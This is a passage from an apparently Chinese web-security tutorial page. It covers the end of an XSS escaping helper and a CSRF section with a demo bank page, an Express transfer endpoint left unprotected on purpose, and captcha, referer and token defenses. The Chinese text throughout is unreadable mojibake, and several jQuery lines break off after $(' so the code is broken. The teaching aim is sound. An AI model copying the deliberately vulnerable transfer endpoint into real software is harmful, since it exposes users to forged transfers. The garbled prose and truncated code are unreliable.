<span class="line">                    if (thechar &gt; 64 &amp;&amp; thechar &lt; 91) { //å¤§å†™å­—æ¯</span>
<span class="line">                        return original;</span>
<span class="line">                    }</span>
<span class="line"></span>
<span class="line">                    if (thechar &gt; 96 &amp;&amp; thechar &lt; 123) { //å°å†™å­—æ¯</span>
<span class="line">                        return original;</span>
<span class="line">                    }</span>
<span class="line"></span>
<span class="line">                    if (thechar &gt; 127) { //å¤§äº127ç”¨unicode</span>
<span class="line">                        var c = thechar;</span>
<span class="line">                        var a4 = c % 16;</span>
<span class="line">                        c = Math.floor(c / 16);</span>
<span class="line">                        var a3 = c % 16;</span>
<span class="line">                        c = Math.floor(c / 16);</span>
<span class="line">                        var a2 = c % 16;</span>
<span class="line">                        c = Math.floor(c / 16);</span>
<span class="line">                        var a1 = c % 16;</span>
<span class="line">                        return &quot;\\\\u&quot; + hex[a1] + hex[a2] + hex[a3] + hex[a4] + &quot;&quot;;</span>
<span class="line">                    }</span>
<span class="line">                    else {</span>
<span class="line">                        return changeTo16Hex(original);</span>
<span class="line">                    }</span>
<span class="line"></span>
<span class="line">                }</span>
<span class="line">            }</span>
<span class="line"></span>
<span class="line">            var preescape = str;</span>
<span class="line">            var escaped = &quot;&quot;;</span>
<span class="line">            var i = 0;</span>
<span class="line">            for (i = 0; i &lt; preescape.length; i++) {</span>
<span class="line">                escaped = escaped + encodeCharx(preescape.charAt(i));</span>
<span class="line">            }</span>
<span class="line">            return escaped;</span>
<span class="line">        }</span>
<span class="line">    &lt;/script&gt;</span>
<span class="line">&lt;/body&gt;</span>
<span class="line"></span>
<span class="line">&lt;/html&gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-csrf" tabindex="-1"><a class="header-anchor" href="#_2-csrf"><span>2. CSRF</span></a></h2><h3 id="_2-1-è·¨ç«™è¯·æ±‚ä¼ªé€ " tabindex="-1"><a class="header-anchor" href="#_2-1-è·¨ç«™è¯·æ±‚ä¼ªé€ "><span>2.1 è·¨ç«™è¯·æ±‚ä¼ªé€ </span></a></h3><p>Cross Site Request Forgery è·¨ç«™è¯·æ±‚ä¼ªé€ </p><ol><li>ç”¨æˆ·Aç™»å½•é“¶è¡Œç½‘ç«™ï¼Œç™»å½•æˆåŠŸåä¼šè®¾ç½®cookie</li><li>é»‘å®¢è¯±å¯¼ç”¨æˆ·Aç™»å½•åˆ°é»‘å®¢çš„ç«™ç‚¹ï¼Œç„¶åä¼šè¿”å›ä¸€ä¸ªé¡µé¢</li><li>ç”¨æˆ·è®¿é—®è¿™ä¸ªé¡µé¢æ—¶ï¼Œè¿™ä¸ªé¡µé¢ä¼šä¼ªé€ ä¸€ä¸ªè½¬è´¦è¯·æ±‚åˆ°é“¶è¡Œç½‘ç«™</li></ol><p>bank.html</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&lt;!DOCTYPE html&gt;</span>
<span class="line">&lt;html lang=&quot;en&quot;&gt;</span>
<span class="line"></span>
<span class="line">&lt;head&gt;</span>
<span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
<span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
<span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span>
<span class="line">    &lt;title&gt;æˆ‘çš„é“¶è¡Œ&lt;/title&gt;</span>
<span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.css&quot;&gt;</span>
<span class="line">&lt;/head&gt;</span>
<span class="line"></span>
<span class="line">&lt;body&gt;</span>
<span class="line">    &lt;div class=&quot;container&quot;&gt;</span>
<span class="line">        &lt;div class=&quot;row&quot;&gt;</span>
<span class="line">            &lt;div class=&quot;col-md-12&quot;&gt;</span>
<span class="line">                &lt;div class=&quot;panel panel-default&quot;&gt;</span>
<span class="line">                    &lt;div class=&quot;panel-heading&quot;&gt;</span>
<span class="line">                        &lt;p&gt;ç”¨æˆ·å</span>
<span class="line">                            &lt;span id=&quot;username&quot;&gt;&lt;/span&gt;</span>
<span class="line">                        &lt;/p&gt;</span>
<span class="line">                        &lt;p&gt;ä½™é¢</span>
<span class="line">                            &lt;span id=&quot;money&quot;&gt;&lt;/span&gt;</span>
<span class="line">                        &lt;/p&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                    &lt;div class=&quot;panel-body&quot;&gt;</span>
<span class="line">                        &lt;form onsubmit=&quot;transfer(event)&quot;&gt;</span>
<span class="line">                            &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                &lt;label for=&quot;target&quot;&gt;è½¬è´¦ç”¨æˆ·&lt;/label&gt;</span>
<span class="line">                                &lt;input id=&quot;target&quot; class=&quot;form-control&quot; placeholder=&quot;è¯·è¾“å…¥çš„ç”¨æˆ·å&quot;&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                            &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                &lt;label for=&quot;amount&quot;&gt;é‡‘é¢&lt;/label&gt;</span>
<span class="line">                                &lt;input id=&quot;amount&quot; class=&quot;form-control&quot; placeholder=&quot;è¯·è¾“å…¥è½¬è´¦çš„é‡‘é¢&quot;&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                            &lt;div class=&quot;form-group&quot;&gt;</span>
<span class="line">                                &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;</span>
<span class="line">                            &lt;/div&gt;</span>
<span class="line">                        &lt;/form&gt;</span>
<span class="line">                    &lt;/div&gt;</span>
<span class="line">                &lt;/div&gt;</span>
<span class="line">            &lt;/div&gt;</span>
<span class="line">        &lt;/div&gt;</span>
<span class="line">    &lt;/div&gt;</span>
<span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.js&quot;&gt;&lt;/script&gt;</span>
<span class="line">    &lt;script&gt;</span>
<span class="line">        $(function () {</span>
<span class="line">            $.get(&#39;/api/user&#39;).then(data =&gt; {</span>
<span class="line">                console.log(data);</span>
<span class="line">                console.log(data.user.username);</span>
<span class="line">                if (data.code == 0) {</span>
<span class="line">                     $(&#39;</span>
<span class="line">                     $(&#39;</span>
<span class="line">                } else {</span>
<span class="line">                    alert(&#39;ç”¨æˆ·æœªç™»å½•&#39;);</span>
<span class="line">                    location.href = &#39;/login.html&#39;;</span>
<span class="line">                }</span>
<span class="line">            });</span>
<span class="line">        });</span>
<span class="line">        function transfer(event) {</span>
<span class="line">            event.preventDefault();</span>
<span class="line">             let target = $(&#39;</span>
<span class="line">             let amount = $(&#39;</span>
<span class="line">            $.post(&#39;/api/transfer&#39;, { target, amount }).then(data =&gt; {</span>
<span class="line">                if (data.code == 0) {</span>
<span class="line">                    alert(&#39;è½¬è´¦æˆåŠŸ&#39;);</span>
<span class="line">                    location.reload();</span>
<span class="line">                } else {</span>
<span class="line">                    alert(&#39;ç”¨æˆ·æœªç™»å½•&#39;);</span>
<span class="line">                    location.href = &#39;/login.html&#39;;</span>
<span class="line">                }</span>
<span class="line">            });</span>
<span class="line">        }</span>
<span class="line">    &lt;/script&gt;</span>
<span class="line">&lt;/body&gt;</span>
<span class="line"></span>
<span class="line">&lt;/html&gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/api/user&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> username <span class="token punctuation">}</span> <span class="token operator">=</span> userSessions<span class="token punctuation">[</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sessionId<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">let</span> user<span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> users<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                user <span class="token operator">=</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> user <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;ç”¨æˆ·æ²¡æœ‰ç™»å½•&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/transfer&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> target<span class="token punctuation">,</span> amount <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span></span>
<span class="line">    amount <span class="token operator">=</span> <span class="token function">isNaN</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">Number</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">let</span> <span class="token punctuation">{</span> username <span class="token punctuation">}</span> <span class="token operator">=</span> userSessions<span class="token punctuation">[</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sessionId<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">let</span> user<span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> users<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>money <span class="token operator">-=</span> amount<span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                users<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>money <span class="token operator">+=</span> amount<span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;ç”¨æˆ·æ²¡æœ‰ç™»å½•&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-2-é˜²å¾¡" tabindex="-1"><a class="header-anchor" href="#_2-2-é˜²å¾¡"><span>2.2 é˜²å¾¡</span></a></h3><ul><li>ç”¨æˆ·ä¸çŸ¥æƒ… éªŒè¯ç  å½±å“ç”¨æˆ·ä½“éªŒ</li><li>è·¨ç«™è¯·æ±‚ ä½¿ç”¨referéªŒè¯ ä¸å¯é </li><li>å‚æ•°ä¼ªé€  token æœ€ä¸»æµçš„é˜²å¾¡CSRF</li></ul><h4 id="_2-2-1-éªŒè¯ç " tabindex="-1"><a class="header-anchor" href="#_2-2-1-éªŒè¯ç "><span>2.2.1 éªŒè¯ç </span></a></h4><p>server.js</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">var</span> svgCaptcha <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;svg-captcha&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/api/captcha&#39;</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">let</span> session <span class="token operator">=</span> userSessions<span class="token punctuation">[</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sessionId<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">var</span> codeConfig <span class="token operator">=</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token literal-property property">size</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token comment">// éªŒè¯ç é•¿åº¦</span></span>
<span class="line">            <span class="token literal-property property">ignoreChars</span><span class="token operator">:</span> <span class="token string">&#39;0o1i&#39;</span><span class="token punctuation">,</span> <span class="token comment">// éªŒè¯ç å­—ç¬¦ä¸­æ’é™¤ 0o1i</span></span>
<span class="line">            <span class="token literal-property property">noise</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// å¹²æ‰°çº¿æ¡çš„æ•°é‡</span></span>
<span class="line">            <span class="token literal-property property">height</span><span class="token operator">:</span> <span class="token number">44</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">        <span class="token keyword">var</span> captcha <span class="token operator">=</span> svgCaptcha<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>codeConfig<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        session<span class="token punctuation">.</span>captcha <span class="token operator">=</span> captcha<span class="token punctuation">.</span>text<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å­˜sessionç”¨äºéªŒè¯æ¥å£è·å–æ–‡å­—ç </span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">captcha</span><span class="token operator">:</span> captcha<span class="token punctuation">.</span>data <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">&#39;æ²¡æœ‰è¯¥ç”¨æˆ·&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>bank.html</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-group&quot;</span><span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string">&quot;captcha&quot;</span> id<span class="token operator">=</span><span class="token string">&quot;captcha&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span></span>
<span class="line">    <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">&quot;captcha&quot;</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;form-control&quot;</span> placeholder<span class="token operator">=</span><span class="token string">&quot;è¯·è¾“å…¥éªŒè¯ç &quot;</span><span class="token operator">&gt;</span></span>
<span class="line"><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"> $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&#39;/api/captcha&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">         <span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;ç”¨æˆ·æœªç™»å½•&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&#39;/login.html&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-2-2-refer-éªŒè¯" tabindex="-1"><a class="header-anchor" href="#_2-2-2-refer-éªŒè¯"><span>2.2.2 refer éªŒè¯</span></a></h4><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"> <span class="token keyword">let</span> referer <span class="token operator">=</span> req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;referer&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\\/\\/localhost:3000</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>referer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line"></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">code</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">&#39;refererä¸æ­£ç¡®&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-2-3-tokenéªŒè¯" tabindex="-1"><a class="header-anchor" href="#_2-2-3-tokenéªŒè¯"><span>2.2.3 tokenéªŒè¯</span></a></h4><p>bank.html</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js"><pre><code class="language-javascript"><span class="line"><span class="token keyword">function</span> <span class="token function">getClientToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">let</span> result <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">token=([^;]+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">return</span> result <span class="token operator">?</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">             <span class="token keyword">let</span> target <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">             <span class="token keyword">let</span> amount <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">             <span class="token keyword">let</span> captcha <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>&#39;</span>
<span class="line">            $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&#39;/api/transfer&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span></span>
<span class="line">                target<span class="token punctuation">,</span></span>
<span class="line">                amount<span class="token punctuation">,</span></span>
<span class="line">                captcha<span class="token punctuation">,</span></span>
<span class="line">                <span class="token literal-property property">clientToken</span><span class="token operator">:</span> <span class="token function">getClientToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
